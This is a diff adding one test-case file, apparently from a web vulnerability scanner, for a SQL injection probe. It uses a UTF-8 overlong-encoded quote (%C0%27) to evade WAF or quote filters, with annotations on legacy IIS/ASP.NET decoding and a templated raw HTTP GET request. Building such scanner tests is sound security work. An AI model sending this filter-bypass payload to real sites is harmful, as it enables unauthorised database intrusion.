@@ -1,0 +1,13 @@
+# @name: UTF-8超长编码引号(%C0%27)
+# @tags: get,sqli,overlong,unicode,iis,aspnet,id,bypass
+# @color: lavender
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: utf8_overlong_quote
+# @intent.param: id
+# @intent.payload: id=1%C0%27and 1=1--
+# @note: UTF-8 超长编码 %C0%27 表示单引号(')，绕过对 %27/单引号的检测，后端宽松解码时还原为引号（旧版 IIS/ASP.NET、部分 WAF 解析差异）。
+GET /?id=1%C0%27and%201=1--%20 HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
